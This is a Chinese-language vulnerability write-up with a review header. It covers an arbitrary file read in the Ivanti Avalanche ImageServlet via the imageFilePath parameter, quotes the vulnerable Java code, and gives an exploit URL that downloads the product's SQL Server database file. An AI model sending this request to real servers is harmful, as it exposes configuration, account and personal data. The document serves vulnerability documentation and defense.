---
source: "MrWQ/vulnerability-paper"
id: "vw-41a8f56a03df2c7c5929af78"
entity_id: "ve-41a8f56a03df2c7c5929af78"
schema_version: "1"
title: "Ivanti Avalanche 目录便利任意文件漏洞读取"
product: "Ivanti Avalanche"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "Premise6.3.2.3490 Windows；权限/文件ACL未说明"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/Ivanti/Ivanti%20Avalanche%20%E7%9B%AE%E5%BD%95%E4%BE%BF%E5%88%A9%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E%E8%AF%BB%E5%8F%96.md"
review_date: "2026-10-02"
side_effects: "读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要的响应，不能由接口可达推定敏感内容已泄露"
source_url: "https://mp.weixin.qq.com/s/F-N_VyITLqYUwz9q8fhZPQ"
source_status: "recorded"
---

# Ivanti Avalanche 目录便利任意文件漏洞读取

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Ivanti Avalanche
- 本文讨论：ImageServlet imageFilePath任意文件读取
- 版本、权限与配置前提：Premise6.3.2.3490 Windows；权限/文件ACL未说明
- 资料类型：源码片段/文件读取PoC；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 标题目录便利错字，实际可直接绝对路径无需遍历
- 读取MDF可能受服务锁/权限限制，不能保证数据库完整下载
- 无CVE/原研究/修复版；Java片段icon局部变量名字重叠需标伪代码

### 操作风险与恢复

- 读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要的响应，不能由接口可达推定敏感内容已泄露

### 待核与来源

- 访问控制、文件锁与官方编号待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


<meta name="referrer" content="no-referrer"/>

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/F-N_VyITLqYUwz9q8fhZPQ)

**1、描述**

  

Ivanti Avalanche 是美国 Ivanti 公司的一套企业移动设备管理系统。该系统主要用于管理智能手机、平板电脑等设备。该漏洞存在于读取存储的头像图片位置，未进行限制格式与目录，造成了任意文件读取。

  

  

  

  

  

**2、影响范围**

  

Avalanche Premise 6.3.2 for Windows v6.3.2.3490

  

  

  

  

  

**3、关键代码**

  

```
String paramImageFilePath = request.getParameter("imageFilePath"); // vulnerable GET parameter
boolean cacheImage = true;
String parameterIcon = request.getParameter("icon");
if (paramImageFilePath != null) {
  File imageFile = new File(paramImageFilePath); // reading from user-input path
  byte[] icon = FileUtils.readFileToByteArray(imageFile);
  String queryString = request.getQueryString();
  if (icon != null && icon.length > 0) {
    handleIcon(response, icon, queryString, false); // outputting the contents
  } else {
    logger.warn(String.format("ImageServlet::missing icon for device(%s)", new Object[] {
      queryString
    }));
  }
...
private void handleIcon(HttpServletResponse response, byte[] icon, String imageSource, boolean cacheImage) throws IOException {
    response.setContentLength(icon.length);
    if (cacheImage) {
      HttpUtils.expiresOneWeek(response);
    } else {
      HttpUtils.expiresNow(response);
    }
    ImageInputStream inputStream = ImageIO.createImageInputStream(new ByteArrayInputStream(icon));
    try {
      Iterator < ImageReader > imageReaders = ImageIO.getImageReaders(inputStream);
      if (imageReaders.hasNext()) {
        ImageReader reader = imageReaders.next();
        String formatName = reader.getFormatName();
        response.setContentType(String.format("image/%s", new Object[] {
          formatName
        }));
      } else {
        logger.warn(String.format("ImageServlet::unknown image format for (%s)", new Object[] {
          imageSource
        }));
      }
    } finally {
      try {
        inputStream.close();
      } catch (IOException iOException) {}
    }
    ServletOutputStream outputStream = response.getOutputStream();
    outputStream.write(icon); // outputting the contents of the file
  }
```

  

  

  

  

  

‍从代码中可以看出文件的访问没有限制到存储位置，允许远程攻击者为在其他地方的文件提供完整的路径并检索其内容。  

  

EXP

访问路径 https://IP:8443/AvalancheWeb/image?imageFilePath = 即可，例如下载 DB，如下：

```
https://IP:8443/AvalancheWeb/image?imageFilePath=C:/Program Files/Microsoft SQL Server/MSSQL11.SQLEXPRESS/MSSQL/DATA/Avalanche.mdf
```

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
